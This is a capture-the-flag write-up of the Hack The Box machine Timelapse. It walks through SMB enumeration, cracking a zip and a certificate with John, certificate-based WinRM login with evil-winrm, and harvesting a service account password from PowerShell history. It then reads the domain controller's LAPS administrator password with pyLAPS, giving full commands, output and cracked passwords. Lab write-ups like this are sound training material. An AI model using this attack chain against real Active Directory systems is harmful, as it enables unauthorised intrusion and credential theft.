---
layout: post
title: Unlocking Timelapse - A Journey Through WinRM, Credential Reuse, and LAPS
date: 02/04/2024
author: Nehal Zaman
tags: ["winrm passwordless authentication", "hardcoded credentials", "laps credential dumping"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/timelapse/banner.png)

# INTRODUCTION

Welcome to our journey into [Timelapse](https://app.hackthebox.com/machines/452)! 

First up, we'll explore how `WinRM` lets us in without needing a password, giving us a basic level of control over the system. 

Next, we'll learn about finding secret credentials hidden in the system, which can help us move up to more powerful user accounts. 

Finally, we'll dive into `LAPS`, a tool that helps us find the keys to the kingdom by revealing local administrator passwords. 

So get ready for a adventure as we go through these key concepts together!

# SCANNING

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ rustscan -a 10.10.11.152               
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.152:53
Open 10.10.11.152:88
Open 10.10.11.152:135
Open 10.10.11.152:139
Open 10.10.11.152:389
Open 10.10.11.152:445
Open 10.10.11.152:464
Open 10.10.11.152:3268
Open 10.10.11.152:3269
Open 10.10.11.152:5986
Open 10.10.11.152:9389
Open 10.10.11.152:49667
Open 10.10.11.152:49673
Open 10.10.11.152:49674
Open 10.10.11.152:49739
Open 10.10.11.152:58278
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 15:18 EDT
Initiating Ping Scan at 15:18
Scanning 10.10.11.152 [2 ports]
Completed Ping Scan at 15:18, 3.10s elapsed (1 total hosts)
Nmap scan report for 10.10.11.152 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.23 seconds
```

We started our exploration by using `Rustscan` to scan the IP address. 

Rustscan identified several open ports on the target system: `53`, `88`, `135`, `139`, `389`, `445`, `464`, `3268`, `3269`, `5986`, `9389`, `49667`, `49673`, `49674`, `49739`, and `58278`.

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ nmap -sC -sV -p53,88,135,139,389,445,464,3268,3269,5986,9389,49667,49673,49674,49739,58278 10.10.11.152 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 15:21 EDT
Nmap scan report for 10.10.11.152
Host is up (0.45s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-01 03:21:57Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
|_ssl-date: 2024-04-01T03:23:56+00:00; +8h00m03s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49739/tcp open  msrpc             Microsoft Windows RPC
58278/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-01T03:22:57
|_  start_date: N/A
|_clock-skew: mean: 8h00m02s, deviation: 0s, median: 8h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.92 seconds
```

Afterward, we used `Nmap` to delve deeper into the services running on these ports. 

Nmap revealed detailed information about each open port, including the services and versions running on them.

From the results, it became apparent that the target system was likely part of an `Active Directory` environment, which hints at the presence of Windows-based systems and services.

# ENUMERATING RPC

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ rpcclient -U="" 10.10.11.152
Password for [WORKGROUP\]:
rpcclient $> srvinfo
        10.10.11.152   Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
rpcclient $>
```

We attempted to explore the Remote Procedure Call (`RPC`) interface using the `rpcclient` tool on the IP address. Surprisingly, we were able to access the `RPC` without providing any username or password.

```shell
rpcclient $> getusrdompwinfo
Usage: getusrdompwinfo rid
rpcclient $> createdomuser nehal
result was NT_STATUS_ACCESS_DENIED
rpcclient $> deletedomuser administrator
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> netshareenum
result was WERR_ACCESS_DENIED
rpcclient $> netshareenumall
result was WERR_ACCESS_DENIED
rpcclient $>
```

Upon accessing the `RPC`, we used various commands like `srvinfo` to gather information about the server. 

However, when we tried commands such as `getusrdompwinfo`, `createdomuser`, `deletedomuser`, `enumdomains`, `enumdomgroups`, `querydispinfo`, `netshareenum`, and `netshareenumall` to retrieve user-related data and other information, we encountered an `NT_STATUS_ACCESS_DENIED` error message. This indicates that while we could access the `RPC`, we lacked the necessary permissions to execute these commands.

It became evident that we required valid credentials to obtain data from the `RPC` effectively.

# ENUMERATING SMB

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ echo exit | smbclient -L \\\\10.10.11.152
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

To gather information about the available shares on the target system, we used the `smbclient` tool. 

`smbclient` displayed several shares including `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `Shares`, and `SYSVOL`. Among these, the `Shares` share drew our attention due to its odd nature.

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ smbclient \\\\10.10.11.152\\Shares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1257956 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1255716 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \Dev\> cd ..\HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1250679 blocks available
smb: \HelpDesk\> mget *
Get file LAPS.x64.msi? y
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (114.3 KiloBytes/sec) (average 98.0 KiloBytes/sec)
Get file LAPS_Datasheet.docx? y
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (37.9 KiloBytes/sec) (average 86.3 KiloBytes/sec)
Get file LAPS_OperationsGuide.docx? y
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (194.0 KiloBytes/sec) (average 106.7 KiloBytes/sec)
Get file LAPS_TechnicalSpecification.docx? y
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (29.4 KiloBytes/sec) (average 97.1 KiloBytes/sec)
smb: \HelpDesk\>
```

We went on to explore the contents of the `Shares` share using `smbclient`. 

Within this share, we discovered two directories: `Dev` and `HelpDesk`. In the `Dev` directory, we identified a file named `winrm_backup.zip`. Additionally, the `HelpDesk` directory contained various `docx` files and an `LAPS` MSI installer, indicating the possible usage of **LAPS** (`Local Administrator Password Solution`) in the system.

We transferred the contents of both directories to our local machine.

# WINRM PASSWORDLESS AUTHENTICATION

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

We started by trying to open a protected file `winrm_backup.zip`, but it needed a password that we didn't know.

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2024-03-31 15:42) 1.282g/s 4447Kp/s 4447Kc/s 4447KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

To get into this file, we used `John` along with `rockyou.txt`. Eventually, we found the password. 

Inside the file, we found something called `legacyy_dev_auth.pfx`, which looked like a certificate. We guessed it might be used for logging into `WinRM` without needing a password.

By default, `WinRM` uses **Basic Authentication** to authenticate users which is not very secure. For a better secure option, `WinRM` also supports **Certificate-based Authentication** that leverages digital certificates to verify users’ identities, ensuring that only authorized entities can access and manage remote systems. Learn more about WinRM passwordless authentication [here](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790).


```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.pem
Enter Import Password:
```

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ cat /usr/share/wordlists/rockyou.txt| grep -i legacy | wc -l
182
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ cat /usr/share/wordlists/rockyou.txt| grep -i legacy > wordlist-legacy.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ john --wordlist=./wordlist-legacy.txt legacyy_dev_auth.pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2024-04-01 04:18) 1.851g/s 337.0p/s 337.0c/s 337.0C/s legacy..*legacy09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

To utilize the certificate for authentication, we needed to convert it into two separate files: a `PEM` file and a `CRT` file. However, this process required the passphrase used to create the certificate. To find this passphrase, we performed a targeted password cracking attempt using a customized wordlist from `rockyou.txt` containing variations of the term `legacy`.

Our strategy proved successful, as we managed to crack the passphrase, allowing us to generate the necessary `PEM` and `CRT` files for passwordless authentication.

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.pem
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ openssl rsa -in legacyy_dev_auth.pem -out legacyy_dev_auth2.pem
Enter pass phrase for legacyy_dev_auth.pem:
writing RSA key
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$
```

With these files generated, we were equipped to proceed with passwordless authentication via `WinRM`.

# SHELL AS LEGACYY

To authenticate over `WinRM`, we had the certificates ready, but we still needed a valid username.

Looking closely at the filename `legacyy_dev_auth.pfx`, we noticed that the word `legacyy` had an extra `y`. This could have been a mistake during certificate creation, or it might actually be a valid username.

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ evil-winrm -i 10.10.11.152 -u legacyy -k ./legacyy_dev_auth2.pem -c ./legacyy_dev_auth.crt -p '' -S 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

We decided to try logging in using the username `legacyy` with the help of `evil-winrm`, as port `5986` was open instead of the standard port `5985` (normally used for `WinRM`). Surprisingly, our attempt was successful.

This allowed us to gain access to the system as the user `legacyy`.

# PRIVILEGE ESCALATION

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> cat ..\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

In the user `legacyy`'s `PowerShell` history, we found the credentials for a service account named `svc_deploy`. Since we have access to `legacyy`'s shell, we can use `BloodHound` to understand more about the `Active Directory` environment.

```shell
*Evil-WinRM* PS C:\Users\legacyy\Documents> .\SharpHound.exe --CollectionMethods All --ZipFileName Ingested.zip
2024-04-01T10:14:29.2102260-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-04-01T10:14:29.3820866-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-04-01T10:14:29.4133501-07:00|INFORMATION|Initializing SharpHound at 10:14 AM on 4/1/2024
2024-04-01T10:14:32.2152759-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for timelapse.htb : dc01.timelapse.htb
2024-04-01T10:14:32.5889607-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-04-01T10:14:32.8401745-07:00|INFORMATION|Beginning LDAP search for timelapse.htb
2024-04-01T10:14:32.9027647-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-04-01T10:14:32.9027647-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-04-01T10:15:03.6368462-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-04-01T10:15:17.0307271-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2024-04-01T10:15:17.0775998-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-04-01T10:15:17.1557232-07:00|INFORMATION|Status: 112 objects finished (+112 2.545455)/s -- Using 42 MB RAM
2024-04-01T10:15:17.1557232-07:00|INFORMATION|Enumeration finished in 00:00:44.3320547
2024-04-01T10:15:17.2495067-07:00|INFORMATION|Saving cache with stats: 71 ID to type mappings.
 71 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-04-01T10:15:17.2495067-07:00|INFORMATION|SharpHound Enumeration Completed at 10:15 AM on 4/1/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\legacyy\Documents> ls


    Directory: C:\Users\legacyy\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/1/2024  10:15 AM          12877 20240401101516_Ingested.zip
-a----         4/1/2024  10:15 AM          10493 NzcwYWNhMTEtODlmNS00OTNiLWEyNjAtZDQ2YjczY2QzMDk2.bin
-a----         4/1/2024   2:06 AM        1046528 SharpHound.exe


*Evil-WinRM* PS C:\Users\legacyy\Documents> copy C:\Users\legacyy\Documents\20240401101516_Ingested.zip \\10.10.16.15\tools\20240401101516_Ingested.zip
```

We used `SharpHound` to ingest data and copied it to our local machine.

![](/assets/images/writeups/timelapse/1.png)

As we had valid credentials for `svc_deploy`, we explored the shortest path from the `svc_deploy` account to the `administrator` account. We discovered that the `svc_deploy` user is part of the `LAPS_READERS` group, which has the privilege `ReadLAPSPassword` on the `dc01.timelapse.htb` domain.

`LAPS`, or **Local Administrator Password Solution**, is a Microsoft tool designed to solve the problem of using the same local administrator password across multiple machines in an Active Directory domain. Each computer managed by `LAPS` has its own unique local administrator password, securely stored and managed by Active Directory. Learn more about `LAPS` [here](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).

Members of the `LAPS_READERS@TIMELAPSE.HTB` group can read the passwords set by `LAPS` on the computer `DC01.TIMELAPSE.HTB`. The local administrator password is stored in the confidential **LDAP** attribute `ms-mcs-AdmPwd`.

```powershell
# Create a credential object
$SecPassword = ConvertTo-SecureString 'compromised_user_password123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('compromised_user', $SecPassword)

# load powerview
Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name
```

Although we attempted to use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to retrieve the `LAPS` password, we encountered issues due to antivirus restrictions. Instead, we utilized [PyLAPS](https://github.com/p0dalirius/pyLAPS) from our attacker machine to extract the `LAPS` password.

```shell
┌──(kali㉿kali)-[~/Documents/Windows-exploitation/active-directory/pyLAPS]
└─$ python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC01$                : {;f3D4@Gr0r3eFCDf7s2j8/+
[+] All done!
```

```shell
┌──(kali㉿kali)-[~/Documents/ctf/htb/timelapse]
└─$ evil-winrm -i 10.10.11.152 -u 'administrator' -p '{;f3D4@Gr0r3eFCDf7s2j8/+' -P 5986 -S 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Finally, armed with the `LAPS` password, we successfully logged in as `administrator` using `Evil-WinRM`.

# CONCLUSION

In the end, our journey through the box showed the power of careful searching and problem-solving. 

We started by finding a `zip` file on `SMB` and uncovered a special certificate inside that helped us log in without a password using WinRM. 

After converting some files from the zip, we got access as user `legacyy`. 

From there, we found secret login details for `svc_deploy`, a user with special permissions to read `LAPS` passwords. By using these details, we grabbed the `LAPS` password and upgraded our access to full control over the system as an `administrator`.

This marks the conclusion of our adventure on this box. 

Thank you for accompanying this far, and looking forward to sharing more exploitations in the next one. Until next time!